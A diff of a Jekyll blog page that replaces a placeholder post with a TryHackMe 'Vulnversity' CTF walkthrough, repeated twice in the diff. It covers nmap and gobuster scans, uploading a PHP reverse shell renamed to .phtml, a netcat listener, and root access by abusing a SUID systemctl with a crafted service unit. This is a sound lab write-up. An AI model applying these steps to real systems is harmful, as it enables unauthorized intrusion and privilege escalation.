@@ -13,7 +13,7 @@
 
 
 
-<title>TryHackMe-Gatekeeper - Mr0Wido's Blog</title>
+<title>TryHackMe - Vulnversity - Mr0Wido's Blog</title>
 
 
 
@@ -29,7 +29,7 @@
 
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>TryHackMe-Gatekeeper - Mr0Wido's Blog</title>
+    <title>TryHackMe - Vulnversity - Mr0Wido's Blog</title>
     <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
     
   </head>
@@ -117,35 +117,216 @@
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe-Gatekeeper</h1>
+  <h1 class="post__title">TryHackMe - Vulnversity</h1>
   <div class="post__content">
-    <p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+    <p>This is an easy CTF. Let’s start.</p>
 
-<p>Jekyll requires blog post files to be named according to the following format:</p>
+<p><br></p>
 
-<p><img src="/assets/img/Screenshot_14.png" alt="image1"></p>
+<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`YEAR-MONTH-DAY-title.MARKUP`
+<p>Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.</p>
 
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
+<p><br></p>
 
-Jekyll also offers powerful support for code snippets:
+<hr>
+
+<p><br></p>
+
+<h2 id="2-reconnaissance">2. Reconnaissance</h2>
+
+<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
+Gather information about this machine using a network scanning tool called <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><br></p>
+
+<h3 id="21-scan-the-box-how-many-ports-are-open">2.1 Scan the box, how many ports are open?</h3>
+
+<p>Let’s find out how many ports are open on the target with a simple <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.56.244
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=&gt; prints 'Hi, Tom' to STDOUT.
+<p><img src="/assets/img/tryhackme/vulnversity/nmap.png" alt="nmap"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6</code></strong></p>
+
+<p><br></p>
+
+<h3 id="22-what-version-of-the-squid-proxy-is-running-on-the-machine">2.2 What version of the squid proxy is running on the machine?</h3>
+
+<p>As you may have noticed from the previous question, squid proxy is http-proxy running on port <code class="language-plaintext highlighter-rouge">3128/tcp</code>.</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.5.12</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">2.3 How many ports will nmap scan if the flag -p-400 was used?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">400</code></strong></p>
+
+<p><br></p>
+
+<h3 id="24-using-the-nmap-flag--n-what-will-it-not-resolve">2.4 Using the nmap flag -n what will it not resolve?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">DNS</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-what-is-the-most-likely-operating-system-this-machine-is-running">2.5 What is the most likely operating system this machine is running?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">ubuntu</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-what-port-is-the-web-server-running-on">2.5 What port is the web server running on?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3333</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="3-locating-directories-using-gobuster">3. Locating directories using GoBuster</h2>
+
+<p>Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.</p>
+
+<p><br></p>
+
+<h3 id="31-what-is-the-directory-that-has-an-upload-form-page">3.1 What is the directory that has an upload form page?</h3>
+
+<p>Now, let’s do a directory scan using <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`$ gobuster dir -u http://10.10.56.244:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 </code></pre></div></div>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home" rel="external nofollow noopener" target="_blank">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll" rel="external nofollow noopener" target="_blank">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/" rel="external nofollow noopener" target="_blank">Jekyll Talk</a>.</p>
+<p><img src="/assets/img/tryhackme/vulnversity/gobuster.png" alt="gobuster"></p>
 
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/internal/</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="4-compromise-the-webserver">4. Compromise the webserver</h2>
+
+<p>Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.</p>
+
+<p><br></p>
+
+<h3 id="41-what-common-file-type-which-youd-want-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out">4.1 What common file type, which you’d want to upload to exploit the server, is blocked? Try a couple to find out.</h3>
+
+<p>I downloaded and tried pentest monkey’s php-reverse-shell.php file, but it didn’t upload.
+<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">php-reverse-shell.php</a></p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/error.png" alt="error"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.php</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-run-this-attack-what-extension-is-allowed">4.2 Run this attack, what extension is allowed?</h3>
+
+<p>Since the .php extension does not work here, we need to try other php extensions instead. If you want, you can do it manually or by using burp suite as tryhackme explained, I don’t see the need to use burp suite for now.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/success.png" alt="success"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.phtml</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-what-is-the-name-of-the-user-who-manages-the-webserver">4.2 What is the name of the user who manages the webserver?</h3>
+
+<p>Now we edit the reverse shell (we adjust the ip and port parts according to ourselves) and upload it.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/set.png" alt="set"></p>
+
+<p>Then we open a listener for the port we wrote in the shell using <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Then we visit the shell that we uploaded to the target site.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ http://10.10.56.244:3333/internal/uploads/shell.phtml
+</code></pre></div></div>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/in.png" alt="in"></p>
+
+<p>Now, to find out who the user is, we go to the <code class="language-plaintext highlighter-rouge">/home</code> directory and list the files using the <code class="language-plaintext highlighter-rouge">ls -la</code> command. There should be a folder with the user’s name here.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/bill.png" alt="bill"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bill</code></strong></p>
+
+<p><br></p>
+
+<h3 id="43-what-is-the-user-flag">4.3 What is the user flag?</h3>
+
+<p>Now we open the <code class="language-plaintext highlighter-rouge">user.txt</code> owned by the user, Bill.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/bill/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/vulnversity/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+
+<p>Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).</p>
+
+<p><br></p>
+
+<h3 id="41-on-the-system-search-for-all-suid-files-what-file-stands-out">4.1 On the system, search for all SUID files. What file stands out?</h3>
+
+<p><em>Hint: Use the command: find / -user root -perm -4000 -print 2&gt;/dev/null</em></p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/find.png" alt="find"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-become-root-and-get-the-last-flag-rootroottxt">4.2 Become root and get the last flag (/root/root.txt).</h3>
+
+<p><em>Hint: /bin/systemctl</em></p>
+
+<p>Let’s enter the following codes one by one to raise privileges and access root.txt.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; /tmp/flag.service &lt;&lt; EOF
+&gt; [Service]
+&gt; ExecStart=/bin/bash -c "cat /root/root.txt &gt; /tmp/flag.txt"
+&gt; [Install]
+&gt; WantedBy=multi-user.target
+&gt; EOF
+$ /bin/systemctl link /tmp/flag.service
+$ /bin/systemctl enable --now /tmp/flag.service
+$ cat /tmp/flag.txt 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/vulnversity/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
 
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Feb 19, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 14, 2023</p>
     <div class="post__categories">
       
       
@@ -157,6 +338,12 @@ print_hi('Tom')
       <p class="post__tags-title">
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
+          
+          <span class="post__tags-item">recon,</span>
+          
+          <span class="post__tags-item">privesc,</span>
+          
+          <span class="post__tags-item">webappsec</span>
           
         </span>
       </p>
@@ -170,8 +357,8 @@ print_hi('Tom')
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/post-9/';
-    this.page.identifier = '/post-9';
+    this.page.url = 'http://localhost:4000/tryhackme-vulnversity/';
+    this.page.identifier = '/tryhackme-vulnversity';
     
     };
 
@@ -521,35 +708,216 @@ print_hi('Tom')
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe-Gatekeeper</h1>
+  <h1 class="post__title">TryHackMe - Vulnversity</h1>
   <div class="post__content">
-    <p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+    <p>This is an easy CTF. Let’s start.</p>
 
-<p>Jekyll requires blog post files to be named according to the following format:</p>
+<p><br></p>
 
-<p><img src="/assets/img/Screenshot_14.png" alt="image1"></p>
+<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`YEAR-MONTH-DAY-title.MARKUP`
+<p>Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.</p>
 
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
+<p><br></p>
 
-Jekyll also offers powerful support for code snippets:
+<hr>
+
+<p><br></p>
+
+<h2 id="2-reconnaissance">2. Reconnaissance</h2>
+
+<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
+Gather information about this machine using a network scanning tool called <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><br></p>
+
+<h3 id="21-scan-the-box-how-many-ports-are-open">2.1 Scan the box, how many ports are open?</h3>
+
+<p>Let’s find out how many ports are open on the target with a simple <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.56.244
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=&gt; prints 'Hi, Tom' to STDOUT.
+<p><img src="/assets/img/tryhackme/vulnversity/nmap.png" alt="nmap"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6</code></strong></p>
+
+<p><br></p>
+
+<h3 id="22-what-version-of-the-squid-proxy-is-running-on-the-machine">2.2 What version of the squid proxy is running on the machine?</h3>
+
+<p>As you may have noticed from the previous question, squid proxy is http-proxy running on port <code class="language-plaintext highlighter-rouge">3128/tcp</code>.</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.5.12</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">2.3 How many ports will nmap scan if the flag -p-400 was used?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">400</code></strong></p>
+
+<p><br></p>
+
+<h3 id="24-using-the-nmap-flag--n-what-will-it-not-resolve">2.4 Using the nmap flag -n what will it not resolve?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">DNS</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-what-is-the-most-likely-operating-system-this-machine-is-running">2.5 What is the most likely operating system this machine is running?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">ubuntu</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-what-port-is-the-web-server-running-on">2.5 What port is the web server running on?</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3333</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="3-locating-directories-using-gobuster">3. Locating directories using GoBuster</h2>
+
+<p>Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.</p>
+
+<p><br></p>
+
+<h3 id="31-what-is-the-directory-that-has-an-upload-form-page">3.1 What is the directory that has an upload form page?</h3>
+
+<p>Now, let’s do a directory scan using <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`$ gobuster dir -u http://10.10.56.244:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 </code></pre></div></div>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home" rel="external nofollow noopener" target="_blank">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll" rel="external nofollow noopener" target="_blank">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/" rel="external nofollow noopener" target="_blank">Jekyll Talk</a>.</p>
+<p><img src="/assets/img/tryhackme/vulnversity/gobuster.png" alt="gobuster"></p>
 
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/internal/</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="4-compromise-the-webserver">4. Compromise the webserver</h2>
+
+<p>Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.</p>
+
+<p><br></p>
+
+<h3 id="41-what-common-file-type-which-youd-want-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out">4.1 What common file type, which you’d want to upload to exploit the server, is blocked? Try a couple to find out.</h3>
+
+<p>I downloaded and tried pentest monkey’s php-reverse-shell.php file, but it didn’t upload.
+<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">php-reverse-shell.php</a></p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/error.png" alt="error"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.php</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-run-this-attack-what-extension-is-allowed">4.2 Run this attack, what extension is allowed?</h3>
+
+<p>Since the .php extension does not work here, we need to try other php extensions instead. If you want, you can do it manually or by using burp suite as tryhackme explained, I don’t see the need to use burp suite for now.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/success.png" alt="success"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.phtml</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-what-is-the-name-of-the-user-who-manages-the-webserver">4.2 What is the name of the user who manages the webserver?</h3>
+
+<p>Now we edit the reverse shell (we adjust the ip and port parts according to ourselves) and upload it.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/set.png" alt="set"></p>
+
+<p>Then we open a listener for the port we wrote in the shell using <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Then we visit the shell that we uploaded to the target site.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ http://10.10.56.244:3333/internal/uploads/shell.phtml
+</code></pre></div></div>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/in.png" alt="in"></p>
+
+<p>Now, to find out who the user is, we go to the <code class="language-plaintext highlighter-rouge">/home</code> directory and list the files using the <code class="language-plaintext highlighter-rouge">ls -la</code> command. There should be a folder with the user’s name here.</p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/bill.png" alt="bill"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bill</code></strong></p>
+
+<p><br></p>
+
+<h3 id="43-what-is-the-user-flag">4.3 What is the user flag?</h3>
+
+<p>Now we open the <code class="language-plaintext highlighter-rouge">user.txt</code> owned by the user, Bill.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/bill/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/vulnversity/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+
+<p>Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).</p>
+
+<p><br></p>
+
+<h3 id="41-on-the-system-search-for-all-suid-files-what-file-stands-out">4.1 On the system, search for all SUID files. What file stands out?</h3>
+
+<p><em>Hint: Use the command: find / -user root -perm -4000 -print 2&gt;/dev/null</em></p>
+
+<p><img src="/assets/img/tryhackme/vulnversity/find.png" alt="find"></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></strong></p>
+
+<p><br></p>
+
+<h3 id="42-become-root-and-get-the-last-flag-rootroottxt">4.2 Become root and get the last flag (/root/root.txt).</h3>
+
+<p><em>Hint: /bin/systemctl</em></p>
+
+<p>Let’s enter the following codes one by one to raise privileges and access root.txt.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; /tmp/flag.service &lt;&lt; EOF
+&gt; [Service]
+&gt; ExecStart=/bin/bash -c "cat /root/root.txt &gt; /tmp/flag.txt"
+&gt; [Install]
+&gt; WantedBy=multi-user.target
+&gt; EOF
+$ /bin/systemctl link /tmp/flag.service
+$ /bin/systemctl enable --now /tmp/flag.service
+$ cat /tmp/flag.txt 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/vulnversity/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
 
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Feb 19, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 14, 2023</p>
     <div class="post__categories">
       
       
@@ -561,6 +929,12 @@ print_hi('Tom')
       <p class="post__tags-title">
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
+          
+          <span class="post__tags-item">recon,</span>
+          
+          <span class="post__tags-item">privesc,</span>
+          
+          <span class="post__tags-item">webappsec</span>
           
         </span>
       </p>
@@ -574,8 +948,8 @@ print_hi('Tom')
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/post-9/';
-    this.page.identifier = '/post-9';
+    this.page.url = 'http://localhost:4000/tryhackme-vulnversity/';
+    this.page.identifier = '/tryhackme-vulnversity';
     
     };
 
